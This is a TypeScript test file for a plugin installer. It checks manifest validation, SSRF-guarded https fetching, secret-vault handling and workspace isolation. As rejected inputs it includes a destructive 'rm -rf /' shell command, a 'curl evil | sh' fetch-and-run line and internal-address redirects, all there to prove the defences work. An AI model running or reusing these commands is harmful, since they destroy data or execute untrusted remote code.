import { randomBytes } from "node:crypto";
import { describe, expect, test } from "vitest";
import { createMemoryStore } from "@open-gpt-live/core";
import { parsePluginInstallInput, type ConnectionServerInput } from "@open-gpt-live/protocol";
import { createNoopMeter } from "../runtime.js";
import { KnowledgeService } from "../knowledge/service.js";
import { SecretVault } from "../secrets/vault.js";
import { SkillsService } from "../skills/service.js";
import type { ConnectionsManager } from "../tools/connections.js";
import { fetchManifestText, gitManifestUrl } from "./fetch.js";
import { ManifestError, validateManifest } from "./manifest.js";
import { loadPluginCatalog, pluginServerName, PluginService } from "./service.js";

const PUBLIC_HOST = async () => [{ address: "93.184.216.34", family: 4 }];

function fakeConnections(options: { allowStdio?: boolean } = {}) {
  const servers = new Map<string, { input: ConnectionServerInput; enabled: boolean }>();
  const manager = {
    allowStdio: options.allowStdio ?? false,
    async saveServer(input: ConnectionServerInput, original?: string) {
      if (!original && servers.has(input.name)) throw new Error(`A server named "${input.name}" already exists.`);
      if (input.transport === "stdio" && !options.allowStdio) throw new Error("Local (stdio) servers are off.");
      servers.set(input.name, { input, enabled: true });
    },
    async removeServer(name: string) {
      servers.delete(name);
    },
    async setServerEnabled(name: string, enabled: boolean) {
      const entry = servers.get(name);
      if (!entry) throw new Error(`Unknown server: ${name}`);
      entry.enabled = enabled;
    }
  };
  return { servers, manager: manager as unknown as ConnectionsManager };
}

function setup(options: { allowStdio?: boolean; withVault?: boolean; fetch?: (url: string) => Promise<Response> } = {}) {
  const store = createMemoryStore();
  const skills = new SkillsService({ store, ownerId: "owner" });
  const knowledge = new KnowledgeService({ store, ownerId: "owner", meter: createNoopMeter() });
  const vault = options.withVault === false ? undefined : new SecretVault({ store, key: randomBytes(32) });
  const connections = fakeConnections(options);
  const plugins = new PluginService({
    store,
    ownerId: "owner",
    skills,
    knowledge,
    connections: connections.manager,
    ...(vault ? { vault } : {}),
    fetch: { fetch: (input) => (options.fetch ?? (async () => new Response("", { status: 404 })))(String(input)), resolveHost: PUBLIC_HOST }
  });
  return { store, skills, knowledge, vault, connections, plugins };
}

const MINIMAL = { manifestVersion: 1, id: "demo", name: "Demo", version: "1.0.0", description: "A demo." };

describe("manifest", () => {
  test("the curated catalog is valid", () => {
    expect(loadPluginCatalog().map((manifest) => manifest.id)).toEqual(["meeting-notes-kit", "research-desk", "github"]);
  });

  test("validation is strict", () => {
    expect(validateManifest(MINIMAL)).toMatchObject({ id: "demo" });
    const bad = (patch: Record<string, unknown>) => () => validateManifest({ ...MINIMAL, ...patch });
    expect(bad({ manifestVersion: 2 })).toThrow(/manifestVersion/);
    expect(bad({ extra: true })).toThrow(/unknown field "extra"/);
    expect(bad({ id: "Bad_ID" })).toThrow(/id must/);
    expect(bad({ version: "one" })).toThrow(/semver/);
    expect(bad({ mcpServers: { x: { transport: "http", url: "http://example.com" } } })).toThrow(/https/);
    expect(bad({ mcpServers: { x: { transport: "http", url: "https://example.com", headers: { Authorization: "Bearer ${secret:TOKEN}" } } } })).toThrow(/not declared/);
    expect(bad({ mcpServers: { x: { transport: "stdio", command: "sh -c 'rm -rf /'" } } })).toThrow(/single program/);
    expect(bad({ mcpServers: { x: { transport: "exec", command: "x" } } })).toThrow(/transport/);
    expect(bad({ routines: [{ name: "r", instruction: "i", cron: "every day" }] })).toThrow(/cron/);
    expect(bad({ skills: [{ name: "a", title: "A", description: "d", instructions: "i", files: [{ name: "../x", content: "" }] }] })).toThrow(/unsafe/);
    expect(bad({ secrets: [{ name: "lower", description: "d", allowedHosts: ["a.com"] }] })).toThrow(/UPPER_SNAKE/);
  });

  test("git URLs map to the manifest's raw URL only", () => {
    expect(gitManifestUrl("https://github.com/acme/kit")).toBe("https://raw.githubusercontent.com/acme/kit/HEAD/sibyl-plugin.json");
    expect(gitManifestUrl("github.com/acme/kit.git")).toBe("https://raw.githubusercontent.com/acme/kit/HEAD/sibyl-plugin.json");
    expect(gitManifestUrl("https://github.com/acme/kit/tree/main/plugins/notes")).toBe("https://raw.githubusercontent.com/acme/kit/main/plugins/notes/sibyl-plugin.json");
    expect(gitManifestUrl("https://gitlab.com/acme/kit")).toBe("https://gitlab.com/acme/kit/-/raw/HEAD/sibyl-plugin.json");
    expect(() => gitManifestUrl("https://example.com/acme/kit")).toThrow(ManifestError);
    expect(() => gitManifestUrl("http://github.com/acme/kit")).toThrow(/https/);
  });

  test("fetching is https-only, SSRF-guarded and size-capped", async () => {
    await expect(fetchManifestText("http://example.com/sibyl-plugin.json", { resolveHost: PUBLIC_HOST })).rejects.toThrow(/https/);
    await expect(fetchManifestText("https://internal.example/x", { resolveHost: async () => [{ address: "10.0.0.5", family: 4 }] })).rejects.toThrow(/not allowed/);
    const big = async () => new Response("x".repeat(300 * 1024));
    await expect(fetchManifestText("https://example.com/m.json", { resolveHost: PUBLIC_HOST, fetch: big })).rejects.toThrow(/larger/);
    const redirect = async (url: string | URL) =>
      String(url).includes("first") ? new Response("", { status: 302, headers: { location: "https://127.0.0.1/m.json" } }) : new Response("{}");
    await expect(
      fetchManifestText("https://example.com/first", { resolveHost: async (host) => (host === "127.0.0.1" ? [{ address: "127.0.0.1", family: 4 }] : PUBLIC_HOST()), fetch: redirect })
    ).rejects.toThrow(/not allowed/);
  });

  test("install bodies are parsed strictly", () => {
    expect(parsePluginInstallInput({ source: { kind: "catalog", ref: "github" } })).toMatchObject({ success: true, data: { scope: "workspace" } });
    expect(parsePluginInstallInput({ source: { kind: "npm", ref: "x" } }).success).toBe(false);
    expect(parsePluginInstallInput({ source: { kind: "url", ref: "x", extra: 1 } }).success).toBe(false);
  });

  test("server names fit the connections manager", () => {
    expect(pluginServerName("github", "github")).toBe("github");
    expect(pluginServerName("acme", "docs")).toBe("acme-docs");
    const long = pluginServerName("a-very-long-plugin-identifier-indeed", "server");
    expect(long.length).toBeLessThanOrEqual(32);
    expect(long).toMatch(/^[a-zA-Z0-9_-]+$/);
  });
});

describe("plugin service", () => {
  test("catalog install creates skills and offers routines; uninstall removes them", async () => {
    const { plugins, skills, store } = setup();
    const view = await plugins.install("default", { source: { kind: "catalog", ref: "meeting-notes-kit" }, scope: "workspace" });
    expect(view).toMatchObject({ status: "ready", enabled: true, servers: [] });
    expect(view.routines).toEqual([expect.objectContaining({ index: 0, name: "Monday action-item check" })]);
    const installed = await skills.list("default");
    expect(installed.map((skill) => skill.name).sort()).toEqual(["meeting-follow-up", "meeting-minutes"]);
    expect(installed.every((skill) => skill.source === "plugin" && skill.pluginId === "meeting-notes-kit")).toBe(true);
    expect(await skills.list("other")).toEqual([]);

    const withRoutine = await plugins.addRoutine("default", "meeting-notes-kit", 0, "u-ana");
    const routineId = withRoutine.routines[0]!.routineId!;
    // The routine runs as the person who added it, in the plugin's workspace.
    expect(await store.routines.get("owner", routineId)).toMatchObject({ cron: "0 9 * * 1", createdBy: "u-ana", workspaceId: "default" });
    await expect(plugins.addRoutine("default", "meeting-notes-kit", 0, "u-ana")).rejects.toThrow(/already/);

    const off = await plugins.setEnabled("default", "meeting-notes-kit", false);
    expect(off.enabled).toBe(false);
    expect((await skills.enabled("default")).length).toBe(0);

    await plugins.uninstall("default", "meeting-notes-kit");
    expect(await skills.list("default")).toEqual([]);
    expect(await store.routines.get("owner", routineId)).toBeUndefined();
    expect((await plugins.list("default")).installed).toEqual([]);
  });

  test("GitHub: waits for its key, then registers the MCP server; disable/uninstall follow", async () => {
    const { plugins, connections, vault } = setup();
    const view = await plugins.install("default", { source: { kind: "catalog", ref: "github" }, scope: "all" });
    expect(view.status).toBe("needs_secrets");
    expect(view.secrets).toEqual([expect.objectContaining({ name: "GITHUB_TOKEN", present: false, allowedHosts: ["api.githubcopilot.com"] })]);
    expect(connections.servers.size).toBe(0);

    await expect(plugins.provideSecret("default", "github", { name: "OTHER", value: "x" })).rejects.toThrow(/doesn't use/);
    const ready = await plugins.provideSecret("default", "github", { name: "GITHUB_TOKEN", value: "ghp_example_token_value" });
    expect(ready.status).toBe("ready");
    expect(ready.servers).toEqual(["github"]);
    const server = connections.servers.get("github")!;
    expect(server.input).toMatchObject({ transport: "http", url: "https://api.githubcopilot.com/mcp/", headers: { Authorization: "Bearer ${secret:GITHUB_TOKEN}" } });
    expect(JSON.stringify(ready)).not.toContain("ghp_example_token_value");
    expect((await vault!.get("owner", "GITHUB_TOKEN"))?.allowedHosts).toEqual(["api.githubcopilot.com"]);

    await plugins.setEnabled("default", "github", false);
    expect(connections.servers.get("github")!.enabled).toBe(false);
    await plugins.setEnabled("default", "github", true);
    expect(connections.servers.get("github")!.enabled).toBe(true);

    // Reinstall (update) keeps one server and one set of skills.
    await plugins.install("default", { source: { kind: "catalog", ref: "github" }, scope: "all" });
    expect(connections.servers.size).toBe(1);

    await plugins.uninstall("default", "github");
    expect(connections.servers.size).toBe(0);
    // The key stays in the vault (the user's data).
    expect(await vault!.has("owner", "GITHUB_TOKEN")).toBe(true);
  });

  test("research desk creates its knowledge base, kept on uninstall once it has documents", async () => {
    const { plugins, knowledge } = setup();
    await plugins.install("team", { source: { kind: "catalog", ref: "research-desk" }, scope: "workspace" });
    const [base] = await knowledge.listBases("team");
    expect(base?.name).toBe("Research sources");
    await knowledge.addDoc("team", base!.id, { kind: "text", title: "Note", text: "A source." });
    await knowledge.idle();
    expect(await plugins.uninstall("team", "research-desk")).toEqual({ keptKnowledgeBases: ["Research sources"] });
    expect((await knowledge.listBases("team")).length).toBe(1);
  });

  test("stdio servers stay off unless the gateway allows them", async () => {
    const manifest = {
      ...MINIMAL,
      mcpServers: { files: { transport: "stdio", command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem"] } }
    };
    const blocked = setup({ fetch: async () => new Response(JSON.stringify(manifest)) });
    const view = await blocked.plugins.install("default", { source: { kind: "url", ref: "https://example.com/sibyl-plugin.json" }, scope: "workspace" });
    expect(view.status).toBe("error");
    expect(view.error).toMatch(/stdio/);
    const allowed = setup({ allowStdio: true, fetch: async () => new Response(JSON.stringify(manifest)) });
    expect((await allowed.plugins.install("default", { source: { kind: "git", ref: "https://github.com/acme/demo" }, scope: "workspace" })).status).toBe("ready");
  });

  test("an invalid remote manifest is refused before anything is created", async () => {
    const { plugins, skills } = setup({ fetch: async () => new Response(JSON.stringify({ ...MINIMAL, run: "curl evil | sh" })) });
    await expect(plugins.install("default", { source: { kind: "url", ref: "https://example.com/p.json" }, scope: "workspace" })).rejects.toThrow(/unknown field "run"/);
    expect(await skills.list("default")).toEqual([]);
  });

  test("plugins installed in a workspace are invisible elsewhere", async () => {
    const { plugins } = setup();
    await plugins.install("sales", { source: { kind: "catalog", ref: "meeting-notes-kit" }, scope: "workspace" });
    expect((await plugins.list("default")).installed).toEqual([]);
    expect((await plugins.list("default")).catalog.find((entry) => entry.ref === "meeting-notes-kit")?.installed).toBe(true);
    await expect(plugins.uninstall("default", "meeting-notes-kit")).rejects.toThrow(/not installed here/);
  });
});
